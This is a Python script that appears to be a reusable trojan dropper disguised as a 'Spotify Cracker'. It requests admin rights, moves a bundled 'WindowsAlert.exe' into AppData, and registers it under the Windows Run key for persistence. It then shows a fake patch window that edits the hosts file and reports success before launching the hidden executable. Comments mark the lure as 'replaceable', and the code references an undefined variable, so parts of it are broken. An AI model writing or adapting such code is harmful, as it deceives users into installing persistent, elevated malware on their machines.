# imports
import winreg as reg
import os
import subprocess
import psutil
import getpass
import os.path
import ctypes, sys
import shutil
from tkinter import *
from tkinter.ttk import *
from random import *
from tkinter import messagebox
import time
import sys
import getpass


# variables
premium_path = os.path.dirname(os.path.abspath( __file__ ))


def main ():
    if is_admin()==False:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
         sys.exit()
    try:
        os.rename("{}\\[replace]\\WindowsAlert.exe".format(premium_path), "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\WindowsAlert.exe".format(getpass.getuser())) # WindowsAlert abs path to new directory
    except:
        pass
    AddToRegistry()
    programGUI()
    subprocess.Popen([r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\WindowsAlert.exe".format(getpass.getuser())]) # WindowsAlert saved directory

def is_admin ():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def AddToRegistry ():    
    # joins the file name to end of path address 
    address="C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\WindowsAlert.exe".format(getpass.getuser())  # WindowsAlert saved directory
      
    # key we want to change is HKEY_CURRENT_USER  
    # key value is Software\Microsoft\Windows\CurrentVersion\Run 
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      
    # open the key to make changes to 
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
      
    # modifiy the opened key 
    reg.SetValueEx(open,"WindowsAlert",0,reg.REG_SZ,address) 
      
    # now close the opened key 
    reg.CloseKey(open)

def programGUI():
    tk=Tk()
    tk.title("Spotify Cracker") # replaceable
    tk.wm_iconbitmap("{}\\locales\\icon.ico".format(premium_path)) # replaceable

    photo = PhotoImage(file="{}\\locales\\cube.png".format(premium_path)) # replaceable
    label = Label(tk, image=photo)
    label.pack()

    progress=Progressbar(tk,orient=HORIZONTAL,length=200,mode='determinate')
    tk.geometry("350x300")
    tk.resizable(0,0)


    def bar():
        """ Add entries to hosts to block adds giving perception of Premium Spotify"""
        # This function can be deleted or replaced depending on the objective
        hosts = """0.0.0.0 adclick.g.doubleclick.net 
0.0.0.0 adeventtracker.spotify.com 
0.0.0.0 ads-fa.spotify.com 
0.0.0.0 analytics.spotify.com 
0.0.0.0 audio2.spotify.com 
0.0.0.0 b.scorecardresearch.com 
0.0.0.0 bounceexchange.com 
0.0.0.0 bs.serving-sys.com 
0.0.0.0 content.bitsontherun.com 
0.0.0.0 core.insightexpressai.com 
0.0.0.0 crashdump.spotify.com 
0.0.0.0 d2gi7ultltnc2u.cloudfront.net 
0.0.0.0 d3rt1990lpmkn.cloudfront.net 
0.0.0.0 desktop.spotify.com 
0.0.0.0 doubleclick.net 
0.0.0.0 ds.serving-sys.com 
0.0.0.0 googleadservices.com 
0.0.0.0 googleads.g.doubleclick.net 
0.0.0.0 gtssl2-ocsp.geotrust.com 
0.0.0.0 js.moatads.com 
0.0.0.0 log.spotify.com 
0.0.0.0 media-match.com 
0.0.0.0 omaze.com 
0.0.0.0 open.spotify.com 
0.0.0.0 pagead46.l.doubleclick.net 
0.0.0.0 pagead2.googlesyndication.com 
0.0.0.0 partner.googleadservices.com 
0.0.0.0 pubads.g.doubleclick.net 
0.0.0.0 redirector.gvt1.com 
0.0.0.0 s0.2mdn.net 
0.0.0.0 securepubads.g.doubleclick.net 
0.0.0.0 tpc.googlesyndication.com 
0.0.0.0 v.jwpcdn.com 
0.0.0.0 video-ad-stats.googlesyndication.com 
0.0.0.0 weblb-wg.gslb.spotify.com
0.0.0.0 www.googleadservices.com 
0.0.0.0 www.googletagservices.com 
0.0.0.0 www.omaze.com """
        with open('C:\\Windows\\System32\\drivers\\etc\\hosts', "a") as the_file: # aditional
            the_file.write(hosts)
        progress.place(relx=0.5, rely=0.75, anchor=CENTER)
        progress['value']=0
        while progress['value']<100:
            time.sleep(1)
            progress['value']+=randint(5,25)
            tk.update_idletasks()
        patch_complete()
            
    def patch_complete():
        messagebox.showinfo("Spotify Cracker", "Spotify Cracked successfully!") # replaceable

    w.pack()
    
    b_bar = Button(tk,text='Patch',width=16,command=bar).place(relx=0.5, rely=0.5, anchor=CENTER)
    mainloop()

        
if __name__=="__main__":
    main()
